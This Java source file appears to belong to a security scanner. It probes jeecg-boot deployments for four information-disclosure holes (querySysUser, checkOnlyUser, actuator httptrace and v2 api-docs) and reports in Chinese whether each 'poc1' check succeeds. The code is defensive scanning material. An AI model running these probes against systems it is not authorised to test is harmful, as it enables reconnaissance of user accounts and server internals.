package com.security.scanner.vulnerabilities;

import net.sf.json.JSONObject;
import com.security.scanner.utils.NetworkUtils;
import com.security.scanner.utils.FileUtils;

public class InfoDisclosureVulnerabilities {
    
    public static String testQuerySysUserInfoLeak(String url, String userAgent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();
        
        try {
            NetworkUtils.configureSSL();
            String response = NetworkUtils.sendGetRequest(normalizedUrl + "/jeecg-boot/sys/user/querySysUser?username=admin", userAgent);
            
            JSONObject jsonObject = JSONObject.fromObject(response);
            int code = jsonObject.optInt("code");
            
            if (code == 0) {
                return formattedDateTime + url + "[+]存在jeecg-boot-querySysUser信息泄露漏洞 poc1\n" + url + "/jeecg-boot/sys/user/querySysUser?username=admin\n";
            } else {
                return formattedDateTime + url + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞 poc1\n";
            }
        } catch (Exception e) {
            return formattedDateTime + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞-poc1\n";
        }
    }

    public static String testCheckOnlyUserInfoLeak(String url, String userAgent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();
        
        try {
            NetworkUtils.configureSSL();
            String response = NetworkUtils.sendGetRequest(normalizedUrl + "/jeecg-boot/sys/user/checkOnlyUser?username=admin", userAgent);
            
            JSONObject jsonObject = JSONObject.fromObject(response);
            int code = jsonObject.optInt("code");
            
            if (code == 0) {
                return formattedDateTime + url + "[+]存在jeecg-boot-checkOnlyUser信息泄露漏洞 poc1\n" + url + "/jeecg-boot/sys/user/checkOnlyUser?username=admin\n";
            } else {
                return formattedDateTime + url + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞poc1\n";
            }
        } catch (Exception e) {
            return formattedDateTime + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞-poc1\n";
        }
    }

    public static String testHttpTraceInfoLeak(String url, String userAgent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();
        
        try {
            NetworkUtils.configureSSL();
            String response = NetworkUtils.sendGetRequest(normalizedUrl + "/jeecg-boot/actuator/httptrace/", userAgent);
            
            if (response.contains("x-real-ip")) {
                return formattedDateTime + url + "[+]存在jeecg-boot-httptrace信息泄露漏洞 poc1\n" + url + "/jeecg-boot/actuator/httptrace/\n";
            } else {
                return formattedDateTime + url + "[-]不存在jeecg-boot-httptrace信息泄露漏洞 poc1\n";
            }
        } catch (Exception e) {
            return formattedDateTime + "[-]不存在jeecg-boot-httptrace信息泄露漏洞-poc1\n";
        }
    }

    public static String testApiDocsInfoLeak(String url, String userAgent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();
        
        try {
            NetworkUtils.configureSSL();
            String response = NetworkUtils.sendGetRequest(normalizedUrl + "/jeecg-boot/v2/api-docs", userAgent);
            
            if (response.contains("JEECG团队")) {
                return formattedDateTime + url + "[+]存在jeecg-boot-v2 api接口信息泄露 poc1\n" + url + "/jeecg-boot/v2/api-docs\n";
            } else {
                return formattedDateTime + url + "[-]不存在jeecg-boot-v2 api接口信息泄露poc1\n";
            }
        } catch (Exception e) {
            return formattedDateTime + "[-]不存在jeecg-boot-v2 api接口信息泄露-poc1\n";
        }
    }
}
